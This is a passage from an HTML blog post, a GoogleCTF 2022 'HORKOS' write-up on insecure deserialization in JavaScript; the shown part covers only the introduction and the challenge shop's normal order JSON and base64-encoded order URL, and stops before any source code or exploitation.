@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>Insecure Deserialization in JavaScript: GoogleCTF 2022 Web/HORKOS Writeup - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/07/11/googlectf-2022-horkos-writeup/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/">
+    
+
+
+
+
+
+    <meta name="description" content="We all heard about insecure deserialization vulnerability and saw many real-world cases in Java, PHP, and other languages. But, we rarely hear about this vulnerability in JavaScript. I think it’s be">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Insecure Deserialization in JavaScript: GoogleCTF 2022 Web&#x2F;HORKOS Writeup">
+<meta property="og:url" content="https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="We all heard about insecure deserialization vulnerability and saw many real-world cases in Java, PHP, and other languages. But, we rarely hear about this vulnerability in JavaScript. I think it’s be">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/googlectf-2022-horkos-writeup/cover-en.png">
+<meta property="article:published_time" content="2022-07-11T11:43:37.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:46:56.910Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/googlectf-2022-horkos-writeup/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="Insecure Deserialization in JavaScript: GoogleCTF 2022 Web/HORKOS Writeup" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#overview">1&nbsp;&nbsp;<b>Overview</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#source-code-rendering">2&nbsp;&nbsp;<b>Source code - rendering</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#source-code-generating-order-data">3&nbsp;&nbsp;<b>Source code - generating order data</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#how-does-deserialization-works">4&nbsp;&nbsp;<b>How does deserialization works?</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#trying-to-mess-up-prototype">5&nbsp;&nbsp;<b>Trying to mess up prototype</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#the-essence-of-insecure-deserialization">6&nbsp;&nbsp;<b>The essence of insecure deserialization</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#exploitation">7&nbsp;&nbsp;<b>Exploitation</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#conclusion">8&nbsp;&nbsp;<b>Conclusion</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2022/07/11/googlectf-2022-horkos-writeup/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            Insecure Deserialization in JavaScript: GoogleCTF 2022 Web/HORKOS Writeup
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-07-11T11:43:37.000Z" itemprop="datePublished">11 July 2022</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <img src="/img/googlectf-2022-horkos-writeup/cover-en.png" style="display:none">
+
+<p>We all heard about insecure deserialization vulnerability and saw many real-world cases in Java, PHP, and other languages.</p>
+<p>But, we rarely hear about this vulnerability in JavaScript. I think it’s because the built-in serialization&#x2F;deserialization function <code>JSON.parse</code> and <code>JSON.stringify</code> are only for basic data structures like string, number, array and object. </p>
+<p>Class and function are not supported, so there is no way to run malicious code during deserialization.</p>
+<p>What if we implement our deserialization logic and support class and function? What could possibly go wrong?</p>
+<p>GoogleCTF 2022 has a web challenge called “HORKOS,” which shows us the way.</p>
+<span id="more"></span>
+
+<h2><span id="overview">Overview</span></h2><p>Before digging into the vulnerability in the challenge, we need to know how it works first.</p>
+<p>This challenge is like a shopping website:</p>
+<p><img src="/img/googlectf-2022-horkos-writeup/p1.png" alt="checkout page"></p>
+<p>After selecting what you want and pressing the “CHECKOUT” button, a request will be sent to <code>POST /order</code> with a JSON string.</p>
+<p>Here is what the JSON looks like when I add one tomato to my shopping cart:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
+   <span class="token punctuation">&#123;</span>
+    <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledShoppingCart"</span><span class="token punctuation">,</span>
+    <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+     <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"items"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledObject"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+         <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Tomato"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+           <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">10</span>
+           <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+           <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"1"</span>
+           <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">]</span>
+         <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+         <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Pickle"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+           <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">8</span>
+           <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+           <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"0"</span>
+           <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">]</span>
+         <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+         <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Pineapple"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+           <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">44</span>
+           <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+           <span class="token punctuation">&#123;</span>
+            <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+            <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"0"</span>
+           <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">]</span>
+         <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">]</span>
+     <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+     <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"address"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledAddress"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+         <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"street"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"my"</span>
+         <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+         <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"number"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">0</span>
+         <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+         <span class="token punctuation">&#123;</span>
+          <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"zip"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+          <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">0</span>
+         <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">]</span>
+     <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+     <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"shoppingCartId"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+      <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">462044767240</span>
+     <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">]</span>
+   <span class="token punctuation">&#125;</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>After that, the user will be redirected to another <code>/order</code> page to see the order:</p>
+<p><img src="/img/googlectf-2022-horkos-writeup/p2.png" alt="order page"></p>
+<p>It’s worth noting that the URL looks like this:</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;horkos-web.2022.ctfcompetition.com&#x2F;order#W1t7ImtleSI6ImNhcnQiLCJ0eXBlIjoicGlja2xlZFNob3BwaW5nQ2FydCIsInZhbHVlIjpbeyJrZXkiOiJpdGVtcyIsInR5cGUiOiJwaWNrbGVkT2JqZWN0IiwidmFsdWUiOlt7ImtleSI6IlRvbWF0byIsInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6MTB9LHsia2V5IjoicXVhbnRpdHkiLCJ0eXBlIjoiU3RyaW5nIiwidmFsdWUiOiIxIn1dfSx7ImtleSI6IlBpY2tsZSIsInR5cGUiOiJwaWNrbGVkSXRlbSIsInZhbHVlIjpbeyJrZXkiOiJwcmljZSIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6OH0seyJrZXkiOiJxdWFudGl0eSIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6IjAifV19LHsia2V5IjoiUGluZWFwcGxlIiwidHlwZSI6InBpY2tsZWRJdGVtIiwidmFsdWUiOlt7ImtleSI6InByaWNlIiwidHlwZSI6Ik51bWJlciIsInZhbHVlIjo0NH0seyJrZXkiOiJxdWFudGl0eSIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6IjAifV19XX0seyJrZXkiOiJhZGRyZXNzIiwidHlwZSI6InBpY2tsZWRBZGRyZXNzIiwidmFsdWUiOlt7ImtleSI6InN0cmVldCIsInR5cGUiOiJTdHJpbmciLCJ2YWx1ZSI6Im15In0seyJrZXkiOiJudW1iZXIiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjB9LHsia2V5IjoiemlwIiwidHlwZSI6Ik51bWJlciIsInZhbHVlIjowfV19LHsia2V5Ijoic2hvcHBpbmdDYXJ0SWQiLCJ0eXBlIjoiTnVtYmVyIiwidmFsdWUiOjQ2MjA0NDc2NzI0MH1dfSx7ImtleSI6ImRyaXZlciIsInR5cGUiOiJwaWNrbGVkRHJpdmVyIiwidmFsdWUiOlt7ImtleSI6InVzZXJuYW1lIiwidHlwZSI6IlN0cmluZyIsInZhbHVlIjoiam9obm55d2Fsa2VyIn0seyJrZXkiOiJvcmRlcnMiLCJ0eXBlIjoicGlja2xlZEFycmF5IiwidmFsdWUiOltdfV19LHsia2V5Ijoib3JkZXJJZCIsInR5cGUiOiJOdW1iZXIiLCJ2YWx1ZSI6NDYyMDQ0NzY3MjQwfV1d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>It’s obviously a base64 encoded string. If we decode it, the result is another similar JSON string:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span>
+   <span class="token punctuation">[</span>
+    <span class="token punctuation">&#123;</span>
+     <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"cart"</span><span class="token punctuation">,</span>
+     <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledShoppingCart"</span><span class="token punctuation">,</span>
+     <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+      <span class="token punctuation">&#123;</span>
+         <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"items"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledObject"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+          <span class="token punctuation">&#123;</span>
+           <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Tomato"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+            <span class="token punctuation">&#123;</span>
+               <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">10</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#123;</span>
+               <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"1"</span>
+            <span class="token punctuation">&#125;</span>
+           <span class="token punctuation">]</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+          <span class="token punctuation">&#123;</span>
+           <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Pickle"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+            <span class="token punctuation">&#123;</span>
+               <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">8</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#123;</span>
+               <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"0"</span>
+            <span class="token punctuation">&#125;</span>
+           <span class="token punctuation">]</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+          <span class="token punctuation">&#123;</span>
+           <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"Pineapple"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledItem"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+            <span class="token punctuation">&#123;</span>
+               <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"price"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">44</span>
+            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token punctuation">&#123;</span>
+               <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"quantity"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"0"</span>
+            <span class="token punctuation">&#125;</span>
+           <span class="token punctuation">]</span>
+          <span class="token punctuation">&#125;</span>
+         <span class="token punctuation">]</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+      <span class="token punctuation">&#123;</span>
+         <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"address"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledAddress"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+          <span class="token punctuation">&#123;</span>
+           <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"street"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"my"</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+          <span class="token punctuation">&#123;</span>
+           <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"number"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">0</span>
+          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+          <span class="token punctuation">&#123;</span>
+           <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"zip"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+           <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">0</span>
+          <span class="token punctuation">&#125;</span>
+         <span class="token punctuation">]</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+      <span class="token punctuation">&#123;</span>
+         <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"shoppingCartId"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">462044767240</span>
+      <span class="token punctuation">&#125;</span>
+     <span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#123;</span>
+     <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"driver"</span><span class="token punctuation">,</span>
+     <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledDriver"</span><span class="token punctuation">,</span>
+     <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+      <span class="token punctuation">&#123;</span>
+         <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"username"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"String"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"johnnywalker"</span>
+      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+      <span class="token punctuation">&#123;</span>
+         <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"orders"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledArray"</span><span class="token punctuation">,</span>
+         <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+          
+         <span class="token punctuation">]</span>
+      <span class="token punctuation">&#125;</span>
+     <span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token punctuation">&#123;</span>
+     <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"orderId"</span><span class="token punctuation">,</span>
+     <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"Number"</span><span class="token punctuation">,</span>
+     <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token number">462044767240</span>
+    <span class="token punctuation">&#125;</span>
+   <span class="token punctuation">]</span>
+<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>That’s it, it seems that it’s a tiny web application without too many features.</p>
+<h2><span id="source-code-rendering">Source code - rendering</span></h2><p>Let’s see how it works under the hood.</p>
+<p>Below is the source code for the core function:</p>
